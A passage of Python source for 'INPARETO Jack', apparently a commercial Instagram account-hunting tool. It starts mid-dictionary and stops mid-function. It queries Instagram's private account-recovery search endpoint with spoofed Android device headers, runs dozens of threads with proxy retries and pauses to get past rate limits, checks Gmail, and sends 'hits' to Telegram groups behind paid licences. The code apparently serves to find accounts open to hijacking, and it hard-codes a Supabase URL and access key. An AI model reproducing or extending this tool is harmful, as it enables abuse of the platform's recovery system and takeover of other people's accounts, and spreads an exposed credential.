            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Bloks-Version-Id": _HIT_LOOKUP_BLOKS_VERSION,
            "X-FB-Friendly-Name": (
                "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/"
            ),
            "X-IG-Android-Id": android_id,
            "X-IG-App-Id": _HIT_LOOKUP_MOBILE_APP_ID,
            "X-IG-App-Locale": "en_IN",
            "X-IG-Client-Endpoint": "com.bloks.www.caa.ar.search",
            "X-IG-Device-Id": device_id,
            "X-IG-Family-Device-Id": family_id,
            "X-IG-Timezone-Offset": str(tz_sec),
            "X-MID": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
            "X-Pigeon-Rawclienttime": str(time.time()),
            "X-Pigeon-Session-Id": f"UFS-{uuid.uuid4()}-0",
        }
        try:
            resp = self._mobile_post(_HIT_LOOKUP_BLOKS_URL, payload, headers)
            if resp is None or getattr(resp, "status_code", 0) != 200:
                return HitRecoveryResult(
                    query=query, found=False, error="Instagram busy", error_kind="rate_limited"
                )
            return _hit_lookup_parse_bloks(query, resp.text)
        except Exception:
            return HitRecoveryResult(
                query=query, found=False, error="Connection error", error_kind="network"
            )

    def lookup(self, query, *, refresh_tokens=True, max_retries=None):
        query = query.strip().lstrip("@")
        if not query:
            return HitRecoveryResult(query=query, found=False, error="Empty query")
        last = None
        retries = max(1, int(max_retries if max_retries is not None else _HIT_LOOKUP_RETRIES))
        for attempt in range(retries):
            if attempt > 0:
                self._init_mobile_http()
                time.sleep(_HIT_LOOKUP_RETRY_DELAY * attempt + random.uniform(0.5, 1.5))
            last = self._lookup_mobile_once(query)
            if last.found:
                return self._enrich(last)
            if last.error_kind not in ("rate_limited", "server", "network", "bootstrap", "upstream"):
                return last
        return last or HitRecoveryResult(
            query=query, found=False, error="Instagram busy", error_kind="rate_limited"
        )

GEN_CMD_MAX_COUNT = 5
GEN_CMD_MAX_MIN = 5000

# ═══ SUPABASE — fill these before encrypting / shipping the build ═══
SUPABASE_URL = "https://pqlchnzcgramceqrsfrn.supabase.co"
SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxbGNobnpjZ3JhbWNlcXJzZnJuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTQ4NTcsImV4cCI6MjA5NDgzMDg1N30.enm6Sz8d5o5Fvgn3FsKMf2dLFtOggGL-mhVBDx853BM"

ip = "127.0.0.1"
port = "5001"


def _is_termux():
    return bool(os.environ.get("TERMUX_VERSION")) or (
        (os.environ.get("PREFIX") or "").startswith("/data/data/com.termux")
    )


def _env_thread_slots(default):
    raw = os.environ.get("JACK_THREADS", "").strip()
    if not raw:
        return default
    try:
        return max(1, int(raw))
    except ValueError:
        return default


# Hunt throughput — desktop vs Termux (phone: lighter workers, longer read timeouts for VPN).
_IS_TERMUX = _is_termux()
if _IS_TERMUX:
    HUNT_PROFILE = "termux"
    TIMEOUT = 52
    # Termux: 56 default — endpoint must allow matching slots (restart endpoint after /set threads).
    TERMUX_HUNT_GATEWAY_MAX = 64
    THREAD_COUNT = _env_thread_slots(56)
    HUNT_CONNECT_TIMEOUT = 4
    HUNT_IG_GEN_READ_TIMEOUT = 22
    HUNT_LOOKUP_READ_TIMEOUT = 18
    HUNT_CYCLE_TIMEOUT = 58
    HUNT_GATEWAY_CONCURRENCY = min(THREAD_COUNT, TERMUX_HUNT_GATEWAY_MAX)
    HUNT_BLIP_WINDOW_SEC = 3.0
    HUNT_BLIP_TRIGGER = 8
    HUNT_BLIP_PAUSE_SEC = 1.0
    HUNT_IG_RATE_LIMIT_STREAK_TRIGGER = 80
    HUNT_IG_RATE_LIMIT_PAUSE_SEC = 120.0
    API_WORKER_IDLE_SEC = 20
    API_WORKER_RECOVERY_IDLE = 1.0
else:
    HUNT_PROFILE = "desktop"
    TIMEOUT = 38
    # Desktop: 64 workers — closer to competitor tools (xd uses 100 direct threads).
    DESKTOP_HUNT_GATEWAY_MAX = 40
    THREAD_COUNT = _env_thread_slots(DESKTOP_HUNT_GATEWAY_MAX)
    HUNT_CONNECT_TIMEOUT = 3
    HUNT_IG_GEN_READ_TIMEOUT = 12
    HUNT_LOOKUP_READ_TIMEOUT = 14
    HUNT_CYCLE_TIMEOUT = 48
    HUNT_GATEWAY_CONCURRENCY = min(THREAD_COUNT, DESKTOP_HUNT_GATEWAY_MAX)
    HUNT_BLIP_WINDOW_SEC = 2.0
    HUNT_BLIP_TRIGGER = 6
    HUNT_BLIP_PAUSE_SEC = 0.8
    HUNT_IG_RATE_LIMIT_STREAK_TRIGGER = 80
    HUNT_IG_RATE_LIMIT_PAUSE_SEC = 120.0
    API_WORKER_IDLE_SEC = 15
    API_WORKER_RECOVERY_IDLE = 3.0

# Mobile hit enrich + panel — desktop keeps env-tunable defaults from above.
if _IS_TERMUX:
    _HIT_LOOKUP_RETRIES = 10
    _HIT_RECOVERY_PROXY_TRIES = 10
    _HIT_POSTS_FETCH_RETRIES = 10
    _HIT_PFP_DOWNLOAD_RETRIES = 2
    _HIT_PFP_REFRESH_ROUNDS = 1
    _HIT_POSTS_FETCH_ROUNDS = 2
    _HIT_CONTACT_SYNC_TIMEOUT = 28
    _HIT_PROFILE_SYNC_TIMEOUT = 32
    _HIT_GRAPHQL_FAST_PROXY_TRIES = 2
    _HIT_GRAPHQL_FAST_HTTP_TIMEOUT = 14
    _HIT_MOBILE_BG_RETRIES = 3
else:
    _HIT_LOOKUP_RETRIES = 4
    _HIT_RECOVERY_PROXY_TRIES = 10
    _HIT_POSTS_FETCH_RETRIES = 10
    _HIT_PFP_DOWNLOAD_RETRIES = 2
    _HIT_PFP_REFRESH_ROUNDS = 1
    _HIT_POSTS_FETCH_ROUNDS = 2
    _HIT_CONTACT_SYNC_TIMEOUT = 180
    _HIT_PROFILE_SYNC_TIMEOUT = 16
    _HIT_GRAPHQL_FAST_PROXY_TRIES = 3
    _HIT_GRAPHQL_FAST_HTTP_TIMEOUT = 8
    _HIT_MOBILE_BG_RETRIES = 2

# Hunt IG lookup — M1 bloks primary in hunt_cycle; /ig_lookup_m1 for legacy 3-hop.
HUNT_IG_LOOKUP_ROUTE = "/ig_lookup_m1"
HUNT_IG_RECOVERY_ROUTE = "/ig_recovery"
_HIT_RECOVERY_API_READ_TIMEOUT = 180
_HIT_CONTACT_HUNT_READ_TIMEOUT = 18 if _IS_TERMUX else 32
_HIT_CONTACT_HUNT_ATTEMPTS = 2
HUNT_BUFFER_BACKLOG_MIN = 960 if _IS_TERMUX else 1200
TERMUX_BUFFER_NEAR_FULL = 220
# Single /hunt_cycle hop — ig_gen + M3 lookup + gmail on endpoint (no 3× localhost round-trips).
HUNT_USE_CYCLE = True
MIN_FOLLOWERS = 10
# IG graphql gen no longer returns follower_count — keep /set min UI, filter disabled server-side.
MIN_FOLLOWERS_FILTER_ENABLED = False
RETRY_TOTAL = 0

STARTUP_PHOTO_URL = "https://pixedge.vercel.app/i/n6ky9h4l"

TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""
DEVICE_HASH = ""
OPERATOR_ID = ""
TELEGRAM_ENABLED = False
TELEGRAM_API_URL = ""
CLOUD_TIMEOUT = 12
CLOUD_CONNECT_TIMEOUT = 5
VERIFY_UI_TIMEOUT = 20
API_PROBE_TIMEOUT = 4.0 if _IS_TERMUX else 5.0
API_PROBE_FAIL_THRESHOLD = 5 if _IS_TERMUX else 10
_api_probe_fail_streak = 0
CLOUD_PROBE_TIMEOUT = 4
PROBE_INTERVAL_OK = 10
PROBE_INTERVAL_FAIL = 2 if _IS_TERMUX else 4
API_HUNT_ALIVE_GRACE_SEC = 30 if _IS_TERMUX else 45
HUNT_KEEPALIVE_BUFFER_MIN = 80 if _IS_TERMUX else 200
HUNT_KEEPALIVE_IDLE_SEC = 120 if _IS_TERMUX else 180

PAUSED_SINCE = None
_admin_settings = {
    "admin_ids": [],
    "admin_bot_token": "",
    "logs_group_id": "",
    "hits_group_id": "",
    "channel_username": "inpareto",
    "operator_bot_name": "INPARETO Jack",
    "operator_bot_description": "Hit alerts & remote hunt control.\nDeveloped by S Crew",
    "operator_bot_short_description": "INPARETO · S Crew",
    "operator_bot_photo_url": "",
}
_ADMIN_SETTINGS_KNOWN_KEYS = frozenset(_admin_settings.keys()) | frozenset({
    "operator_hit_group_title",
    "operator_hit_group_description",
    "operator_hit_group_photo_url",
})
_admin_access_cache = {"user_id": None, "ok": False, "at": 0.0}
_ban_cache = {"user_id": None, "banned": False, "at": 0.0}
_admin_settings_loaded_at = 0.0
_operator_gate_cache = {"user_id": None, "ok": None, "at": 0.0}
_operator_access_sticky_until = 0.0
_gate_terminal_print_at = 0.0
_hit_group_admin_cache = {"gid": "", "ok": None, "at": 0.0}
_hit_group_last_delivery_at = 0.0
_tg_fast_executor = ThreadPoolExecutor(max_workers=12, thread_name_prefix="tgfast")
_tg_cmd_executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tgcmd")
TG_INSTANT_TIMEOUT = 4
TG_INSTANT_MAX_RETRIES = 1
_operator_cmd_ctx = threading.local()
ADMIN_ACCESS_TTL = 90
BAN_CHECK_TTL = 25
ADMIN_SETTINGS_TTL = 60
ADMIN_MEMBER_TIMEOUT = 3
HIT_GROUP_MEMBER_TIMEOUT = 5
STARTUP_PHOTO_TIMEOUT = 12
STARTUP_PHOTO_RETRIES = 4
STARTUP_PHOTO_RETRY_DELAY = 1.25
STARTUP_PHOTO_TOTAL_WAIT_SEC = 14.0
STARTUP_PHOTO_SEND_RETRIES = 4
STARTUP_PHOTO_CACHE_TTL = 600
BOT_BRANDING_RETRIES = 4
BOT_BRANDING_RETRY_DELAY = 2.0
BOT_PHOTO_DOWNLOAD_TIMEOUT = 25
OPERATOR_GATE_TTL = 180
OPERATOR_ACCESS_STICKY_SEC = 900
ACCESS_TRUST_GRACE_SEC = 3600
_access_trust_ok_at = 0.0
SESSION_VERIFIED_MAX_AGE_SEC = 7 * 24 * 3600
TG_BOT_CMD_MAX_RETRIES = 6
_legacy_state_migrated = False
_picked_state_dir = None
_STATE_KEY_V2 = b"v2"
HIT_GROUP_ADMIN_TTL = 300
GATE_TERMINAL_PRINT_COOLDOWN = 300.0
TERMINAL_NOTICE_REPEAT_SEC = 600.0
ACCESS_SYNC_INTERVAL_SEC = 20
_session_awaiting_verification = False
_boot_configuring = False
_telegram_monitor_started = False
_terminal_notice_signature = ""
_terminal_notice_last_print_at = 0.0
LICENSE_REGISTRY_KEY = "paid_access"
USER_HIT_GROUP_REGISTRY_KEY = "operator_hit_groups"
OPERATOR_LINKS_REGISTRY_KEY = "operator_links"
LICENSE_CACHE_TTL = 45
LICENSE_MAX_DAYS = 3650
LICENSE_KEY_PREFIX = "INPA"
FREE_TRIAL_DAYS = 7
FREE_DAILY_GEN_LIMIT = 10_000
PLAN_FREE = "free"
PLAN_PREMIUM = "premium"
FREE_PLAN_WARN_PCT = (0.80, 0.95)
PLAN_CLOUD_OFFLINE_GRACE_SEC = 7200
PLAN_REGISTRY_RELOAD_SEC = 30
PLAN_CLOUD_BATCH_EVERY = 8 if _IS_TERMUX else 12
_plan_acquire_cache = {
    "user_id": "",
    "row": None,
    "reg": None,
    "loaded_at": 0.0,
    "cloud_pending": 0,
}
_plan_limit_notify_signature = ""
_plan_limit_warn_level = 0
_plan_limit_warn_day = ""
_paid_access_cache = {"registry": None, "at": 0.0}
_paid_access_lock = threading.Lock()
_license_registry_lock = threading.RLock()
_admin_settings_io_lock = threading.RLock()
TG_CMD_MAX_RETRIES = 2
ADMIN_MEMBER_OK = frozenset({"creator", "administrator", "member", "restricted"})
ACCESS_BLOCKED = False
_access_sync_stop = threading.Event()
_hit_group_gate_state = {
    "message_ids": [],
    "last_send_at": 0.0,
    "last_edit_id": None,
}
_hit_group_gate_lock = threading.Lock()
HIT_GROUP_GATE_SEND_COOLDOWN = 15.0
_fav_note_pending = {"username": None}
_fav_note_pending_lock = threading.Lock()
FAV_NOTE_MAX_LEN = 500
_cloud_favorite_notes_column = None
_cloud_quality_columns = None

_QUALITY_CLOUD_KEYS = (
    "best_hit_quality",
    "quality_hits_3plus",
    "quality_hits_4plus",
    "quality_hits_5",
)

_health_cache = {
    "api": None,
    "cloud": None,
    "api_at": 0.0,
    "cloud_at": 0.0,
    "api_base": None,
    "api_via": None,
}
_health_lock = threading.Lock()
DASHBOARD_SHOW_LOGO = True
DASHBOARD_INTERVAL = 2.5 if _IS_TERMUX else 1.0
DASHBOARD_LIVE_INTERVAL = 2.0
JACK_PANEL_LIVE = False
_dashboard_plan_cache = {"uid": "", "snap": {}, "at": 0.0}
_panel_refresh_stop = threading.Event()
_panel_refresh_thread = None
_panel_paint_lock = threading.Lock()
_panel_alt_screen = False
_panel_live_drawn_once = False
_panel_last_draw_at = 0.0
_panel_last_frame_lines = 0
_last_dashboard_stats = {
    "gen": 0, "valid": 0, "hit": 0, "errors": 0, "events": [], "at": 0.0,
}
DASHBOARD_PLAN_CACHE_TTL = 25.0
DASHBOARD_PLAN_STICKY_PREMIUM_SEC = 3600
_hunt_license_cache = {"ok": None, "at": 0.0}
HUNT_LICENSE_CACHE_TTL = 45


def _legacy_script_state_dir():
    """Old default: state beside joint.py (lost when cwd/script path changes)."""
    try:
        base = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        base = os.getcwd()
    return base or os.getcwd()


def _default_persistent_state_dir():
    xdg = os.environ.get("XDG_DATA_HOME", "").strip()
    if xdg:
        return os.path.join(os.path.abspath(xdg), "inpareto")
    return os.path.join(os.path.expanduser("~"), ".inpareto")


def _migrate_legacy_state_files(target_dir):
    global _legacy_state_migrated
    if _legacy_state_migrated:
        return
    _legacy_state_migrated = True
    legacy = os.path.abspath(_legacy_script_state_dir())
    target = os.path.abspath(target_dir)
    if legacy == target or not os.path.isdir(legacy):
        return
    try:
        names = [
            n for n in os.listdir(legacy)
            if n.startswith(".inpareto") and os.path.isfile(os.path.join(legacy, n))
        ]
    except OSError:
        return
    for name in names:
        src = os.path.join(legacy, name)
        dst = os.path.join(target, name)
        if os.path.isfile(dst):
            continue
        try:
            shutil.copy2(src, dst)
        except OSError as exc:
            log_event("STATE", f"migrate {name}: {str(exc)[:40]}")


def _state_dir_candidates():
    """Every directory that may hold .inpareto_* (folder can differ from cwd)."""
    seen = set()
    out = []
    override = (
        os.environ.get("VAULT_STATE_DIR", "").strip()
        or os.environ.get("INPARETO_STATE_DIR", "").strip()
    )

    def add(path):
        path = os.path.abspath(path or "")
        if not path or path in seen:
            return
        seen.add(path)
        out.append(path)

    if override:
        add(override)
    add(_default_persistent_state_dir())
    add(_legacy_script_state_dir())
    add(os.getcwd())
    return out


def _key_material_variants(state_dir=None, *, legacy_hostname=False):
    """All sealing keys ever used — needed because path-bound keys break after dir move."""
    mats = []
    seen = set()

    def add(parts):
        material = b"|".join(parts)
        if material in seen:
            return
        seen.add(material)
        mats.append(material)

    add([_STATE_KDF_PEPPER, _STATE_KEY_V2, platform.system().encode()])
    dirs = [os.path.abspath(state_dir)] if state_dir else []
    for d in _state_dir_candidates():
        d = os.path.abspath(d)
        if d not in dirs:
            dirs.append(d)
    for d in dirs:
        add([_STATE_KDF_PEPPER, d.encode("utf-8"), platform.system().encode()])
        if legacy_hostname:
            add([
                _STATE_KDF_PEPPER,
                d.encode("utf-8"),
                platform.node().encode("utf-8", errors="replace"),
                str(uuid.getnode()).encode(),
                platform.system().encode(),
            ])
    return mats


def _device_state_dir():
    """Where .inpareto_* live. Vault launchers set VAULT_STATE_DIR (or legacy INPARETO_STATE_DIR)."""
    global _picked_state_dir
    if _picked_state_dir:
        return _picked_state_dir
    override = (
        os.environ.get("VAULT_STATE_DIR", "").strip()
        or os.environ.get("INPARETO_STATE_DIR", "").strip()
    )
    if override:
        base = os.path.abspath(override)
    else:
        base = None
        for candidate in _state_dir_candidates():
            if _dir_has_readable_session(candidate):
                base = os.path.abspath(candidate)
                break
        if not base:
            base = _default_persistent_state_dir()
        target = _default_persistent_state_dir()
        if os.path.abspath(base) != os.path.abspath(target):
            _migrate_legacy_state_files(target)
    os.makedirs(base, exist_ok=True)
    _picked_state_dir = base
    return base


def reconcile_local_session_at_boot():
    """Pick the folder that actually decrypts .inpareto_* and drop stale logout flags."""
    global _picked_state_dir
    override = (
        os.environ.get("VAULT_STATE_DIR", "").strip()
        or os.environ.get("INPARETO_STATE_DIR", "").strip()
    )
    if override:
        _picked_state_dir = os.path.abspath(override)
        os.makedirs(_picked_state_dir, exist_ok=True)
        return
    for d in _state_dir_candidates():
        flag = os.path.join(d, ".inpareto_logged_out")
        if os.path.isfile(flag) and _dir_has_readable_session(d):
            try:
                os.remove(flag)
                log_event("STATE", f"removed stale logout flag in {d}")
            except OSError:
                pass
    for d in _state_dir_candidates():
        if _dir_has_readable_session(d):
            _picked_state_dir = os.path.abspath(d)
            log_event("STATE", f"session dir: {_picked_state_dir}")
            target = _default_persistent_state_dir()
            if _picked_state_dir != os.path.abspath(target):
                _migrate_legacy_state_files(target)
            return
    _picked_state_dir = _default_persistent_state_dir()
    _migrate_legacy_state_files(_picked_state_dir)
    os.makedirs(_picked_state_dir, exist_ok=True)


_STATE_FILE_PREFIX = "INPA1:"
_STATE_KDF_PEPPER = b"INPARETO.LocalState.v1"
_local_fernet = None
_local_fernet_lock = threading.Lock()


def _local_state_key_material():
    """v2 key — same on every machine; not tied to state folder path."""
    return b"|".join([
        _STATE_KDF_PEPPER,
        _STATE_KEY_V2,
        platform.system().encode(),
    ])


def _local_state_key_material_legacy():
    """Hostname/MAC variant for the active state dir (oldest seals)."""
    variants = _key_material_variants(_device_state_dir(), legacy_hostname=True)
    for material in variants:
        if platform.node().encode("utf-8", errors="replace") in material:
            return material
    return variants[-1] if variants else _local_state_key_material()


def _local_state_fernet():
    """Machine-bound Fernet key — .inpareto_* not readable on another PC."""
    global _local_fernet
    with _local_fernet_lock:
        if _local_fernet is not None:
            return _local_fernet
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

            material = _local_state_key_material()
            salt = hashlib.sha256(material).digest()[:16]
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=200_000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(material))
            _local_fernet = Fernet(key)
        except ImportError:
            _local_fernet = False
        return _local_fernet


def _local_state_key_bytes():
    return hashlib.sha256(_local_state_key_material()).digest()


def _xor_state_bytes(data, key):
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key[i % len(key)])
    return bytes(out)


def _seal_local_state(plain):
    text = str(plain if plain is not None else "")
    fernet = _local_state_fernet()
    if fernet:
        token = fernet.encrypt(text.encode("utf-8")).decode("ascii")
        return f"{_STATE_FILE_PREFIX}{token}"
    key = _local_state_key_bytes()
    payload = text.encode("utf-8")
    xpayload = _xor_state_bytes(payload, key)
    sig = hmac.new(key, xpayload, hashlib.sha256).digest()
    blob = base64.urlsafe_b64encode(sig + xpayload).decode("ascii")
    return f"{_STATE_FILE_PREFIX}H1:{blob}"


def _local_state_key_bytes_from_material(material):
    return hashlib.sha256(material).digest()


def _dir_has_readable_session(state_dir):
    """True if this folder has decryptable telegram id + bot token."""
    state_dir = os.path.abspath(state_dir or "")
    chat_path = os.path.join(state_dir, ".inpareto_telegram")
    bot_path = os.path.join(state_dir, ".inpareto_bot")
    chat = _read_local_state_file_at(chat_path, state_dir=state_dir).strip()
    tok = _read_local_state_file_at(bot_path, state_dir=state_dir).strip()
    return bool(chat and tok)


def _open_local_state_sealed_body(body, key_material):
    if not body.startswith("H1:"):
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

            salt = hashlib.sha256(key_material).digest()[:16]
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=200_000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(key_material))
            return Fernet(key).decrypt(body.encode("ascii")).decode("utf-8")
        except Exception:
            return None
    if body.startswith("H1:"):
        try:
            packed = base64.urlsafe_b64decode(body[3:])
            sig, xpayload = packed[:32], packed[32:]
            key = _local_state_key_bytes_from_material(key_material)
            if not hmac.compare_digest(hmac.new(key, xpayload, hashlib.sha256).digest(), sig):
                return None
            payload = _xor_state_bytes(xpayload, key)
            return payload.decode("utf-8")
        except Exception:
            return None
    return None


def _open_local_state(raw, *, state_dir_hint=None):
    raw = (raw or "").strip()
    if not raw:
        return ""
    if not raw.startswith(_STATE_FILE_PREFIX):
        return raw
    body = raw[len(_STATE_FILE_PREFIX):]
    hint_dir = os.path.dirname(os.path.abspath(state_dir_hint)) if state_dir_hint else None
    for material in _key_material_variants(hint_dir, legacy_hostname=False):
        plain = _open_local_state_sealed_body(body, material)
        if plain is not None:
            return plain
    for material in _key_material_variants(hint_dir, legacy_hostname=True):
        plain = _open_local_state_sealed_body(body, material)
        if plain is not None:
            return plain
    log_event("STATE", "sealed file decrypt failed")
    return None


def _read_local_state_file_at(path, *, state_dir=None):
    try:
        if not os.path.isfile(path):
            return ""
        with open(path, encoding="utf-8") as f:
            raw = f.read()
        hint = state_dir or os.path.dirname(os.path.abspath(path))
        plain = _open_local_state(raw, state_dir_hint=hint)
        if plain is None:
            return ""
        return plain
    except OSError:
        return ""


def _read_local_state_file(path):
    try:
        if not os.path.isfile(path):
            return ""
        with open(path, encoding="utf-8") as f:
            raw = f.read()
        plain = _open_local_state(raw, state_dir_hint=os.path.dirname(os.path.abspath(path)))
        if plain is None:
            return ""
        if plain:
            try:
                _write_local_state_file(path, plain)
            except OSError:
                pass
        return plain
    except OSError:
        return ""


def _write_local_state_file(path, plain):
    try:
        sealed = _seal_local_state(plain)
        with open(path, "w", encoding="utf-8") as f:
            f.write(sealed)
    except OSError as exc:
        log_event("STATE", str(exc)[:80])


def _read_local_state_json(path):
    text = _read_local_state_file(path)
    if not text:
        return None
    try:
        data = json.loads(text)
        return data if isinstance(data, dict) else None
    except json.JSONDecodeError:
        log_event("STATE", f"invalid json in {os.path.basename(path)}")
        return None


def _write_local_state_json(path, obj):
    _write_local_state_file(path, json.dumps(obj, ensure_ascii=False))


def _device_id_file():
    return os.path.join(_device_state_dir(), ".inpareto_device")


def _device_chat_file():
    return os.path.join(_device_state_dir(), ".inpareto_telegram")


def _bot_token_file():
    return os.path.join(_device_state_dir(), ".inpareto_bot")


def persist_local_bot_token(token):
    tok = (token or "").strip()
    if tok:
        _write_local_state_file(_bot_token_file(), tok)


def _read_stored_bot_token():
    tok = _read_local_state_file(_bot_token_file()).strip()
    return tok if tok else ""


def clear_local_bot_token():
    try:
        if os.path.isfile(_bot_token_file()):
            os.remove(_bot_token_file())
    except OSError:
        pass


def has_local_operator_session():
    """Logged-in on this install: local Telegram id + bot token, not logged out."""
    global _picked_state_dir
    if is_locally_logged_out():
        return False
    chat = _read_stored_chat_id()
    tok = _read_stored_bot_token()
    if chat and tok:
        return True
    for d in _state_dir_candidates():
        if _dir_has_readable_session(d):
            if not _picked_state_dir:
                _picked_state_dir = os.path.abspath(d)
            return not is_locally_logged_out()
    return False


def clear_local_device_id():
    try:
        if os.path.isfile(_device_id_file()):
            os.remove(_device_id_file())
    except OSError:
        pass


def clear_all_local_operator_state(*, mark_logged_out=False):
    """Wipe local session — license + hit group stay on Telegram id in cloud."""
    clear_local_hit_group_id()
    clear_local_hit_group_owner()
    clear_local_license()
    clear_local_free_plan()
    clear_local_bot_token()
    try:
        if os.path.isfile(_device_chat_file()):
            os.remove(_device_chat_file())
    except OSError:
        pass
    # Also remove legacy device id file (old versions).
    clear_local_device_id()
    clear_operator_session_verified()
    global _cached_hit_group_id, _operator_access_sticky_until
    _cached_hit_group_id = None
    _operator_access_sticky_until = 0.0
    if mark_logged_out:
        mark_local_logged_out()
    else:
        clear_local_logged_out()


def _hit_group_owner_file():
    return os.path.join(_device_state_dir(), ".inpareto_hit_group_owner")


def _hit_group_id_file():
    return os.path.join(_device_state_dir(), ".inpareto_hit_group")


def _license_local_file():
    return os.path.join(_device_state_dir(), ".inpareto_license")


def _invalidate_dashboard_plan_cache():
    _dashboard_plan_cache.update(uid="", snap={}, at=0.0)


def persist_local_license(user_id, expires_at_iso):
    uid = str(user_id or "").strip()
    if not uid:
        return
    _write_local_state_json(
        _license_local_file(),
        {"user_id": uid, "expires_at": expires_at_iso},
    )
    _invalidate_dashboard_plan_cache()


def read_local_license():
    data = _read_local_state_json(_license_local_file())
    if not data:
        return None
    uid = str(data.get("user_id") or "").strip()
    if not uid:
        return None
    linked = str(resolve_operator_telegram_id() or _read_stored_chat_id() or "").strip()
    if linked and uid != linked:
        return None
    return data


def clear_local_license():
    try:
        if os.path.isfile(_license_local_file()):
            os.remove(_license_local_file())
    except OSError:
        pass
    _invalidate_dashboard_plan_cache()


def _free_plan_local_file():
    return os.path.join(_device_state_dir(), ".inpareto_free_plan")


def persist_local_free_plan(user_id, row):
    uid = str(user_id or "").strip()
    if not uid or not isinstance(row, dict):
        return
    payload = {
        "user_id": uid,
        "started_at": row.get("started_at"),
        "trial_ends_at": row.get("trial_ends_at"),
        "last_day": row.get("last_day"),
        "day_count": int(row.get("day_count") or 0),
    }
    _write_local_state_json(_free_plan_local_file(), payload)


def read_local_free_plan():
    data = _read_local_state_json(_free_plan_local_file())
    if not data:
        return None
    uid = str(data.get("user_id") or "").strip()
    if not uid:
        return None
    linked = str(resolve_operator_telegram_id() or _read_stored_chat_id() or "").strip()
    if linked and uid != linked:
        return None
    return data


def clear_local_free_plan():
    try:
        if os.path.isfile(_free_plan_local_file()):
            os.remove(_free_plan_local_file())
    except OSError:
        pass


def persist_local_hit_group_id(group_id):
    gid = str(group_id or "").strip()
    if not gid:
        return
    _write_local_state_file(_hit_group_id_file(), gid)


def read_local_hit_group_id():
    gid = _read_local_state_file(_hit_group_id_file()).strip()
    return gid if gid else ""


def preserve_operator_hit_group_for_user(chat_id=None):
    """Write hit group to cloud registry by Telegram id — call before logout clears local files."""
    chat_id = str(
        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
    ).strip()
    if not chat_id or not is_cloud_enabled():
        return None
    gid = read_local_hit_group_id()
    if not gid:
        cached = _cached_hit_group_id
        if cached:
            gid = str(cached).strip()
    if not gid:
        gid = fetch_operator_hit_group_id_for_telegram_user(chat_id) or ""
    gid = str(gid or "").strip()
    if gid:
        err = user_hit_group_set(chat_id, gid)
        if not err:
            return gid
        log_event("HITGROUP", f"preserve failed: {str(err)[:80]}")
    return None


def restore_operator_hit_group_for_user(chat_id=None):
    """Pull hit group from registry / cloud into local .inpareto_hit_group."""
    global _cached_hit_group_id
    chat_id = str(
        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
    ).strip()
    if not chat_id:
        return ""
    local = read_local_hit_group_id()
    if local:
        _cached_hit_group_id = local
        if not read_local_hit_group_owner():
            persist_local_hit_group_owner(chat_id)
        return local
    gid = fetch_operator_hit_group_id_for_telegram_user(chat_id)
    if not gid:
        return ""
    persist_local_hit_group_id(gid)
    persist_local_hit_group_owner(chat_id)
    _cached_hit_group_id = gid
    return gid


def sync_local_hit_group_from_cloud():
    """Pull hit group from cloud by Telegram id (never machine fingerprint)."""
    if is_locally_logged_out():
        return read_local_hit_group_id()
    if not has_local_operator_session() and not resolve_operator_telegram_id():
        return read_local_hit_group_id()
    gid = read_local_hit_group_id()
    if gid:
        chat_id = resolve_operator_telegram_id()
        if chat_id and not read_local_hit_group_owner():
            persist_local_hit_group_owner(chat_id)
        return gid
    chat_id = resolve_operator_telegram_id()
    if not chat_id or not is_cloud_enabled():
        return ""
    return restore_operator_hit_group_for_user(chat_id) or ""


def clear_local_hit_group_id():
    try:
        if os.path.isfile(_hit_group_id_file()):
            os.remove(_hit_group_id_file())
    except OSError:
        pass


def persist_local_hit_group_owner(chat_id):
    chat_id = str(chat_id or "").strip()
    if not chat_id:
        return
    _write_local_state_file(_hit_group_owner_file(), chat_id)


def read_local_hit_group_owner():
    owner = _read_local_state_file(_hit_group_owner_file()).strip()
    return owner if owner else ""


def clear_local_hit_group_owner():
    try:
        if os.path.isfile(_hit_group_owner_file()):
            os.remove(_hit_group_owner_file())
    except OSError:
        pass


def _session_verified_file():
    return os.path.join(_device_state_dir(), ".inpareto_session_verified")


def persist_operator_session_verified(chat_id=None):
    """Remember completed setup so restarts skip the full verification wall."""
    chat_id = str(
        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
    ).strip()
    if not chat_id:
        return
    _write_local_state_json(
        _session_verified_file(),
        {"telegram_chat_id": chat_id, "verified_at": license_iso_now()},
    )


def read_operator_session_verified(chat_id=None):
    chat_id = str(
        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
    ).strip()
    if not chat_id or is_locally_logged_out():
        return False
    data = _read_local_state_json(_session_verified_file())
    if not data:
        return False
    if str(data.get("telegram_chat_id") or "").strip() != chat_id:
        return False
    verified_at = license_parse_iso(data.get("verified_at"))
    if not verified_at:
        return False
    age = (datetime.now(timezone.utc) - verified_at).total_seconds()
    return age < SESSION_VERIFIED_MAX_AGE_SEC


def clear_operator_session_verified():
    try:
        if os.path.isfile(_session_verified_file()):
            os.remove(_session_verified_file())
    except OSError:
        pass


def _logout_flag_file():
    return os.path.join(_device_state_dir(), ".inpareto_logged_out")


def mark_local_logged_out():
    _write_local_state_file(_logout_flag_file(), "1")


def clear_local_logged_out():
    try:
        if os.path.isfile(_logout_flag_file()):
            os.remove(_logout_flag_file())
    except OSError:
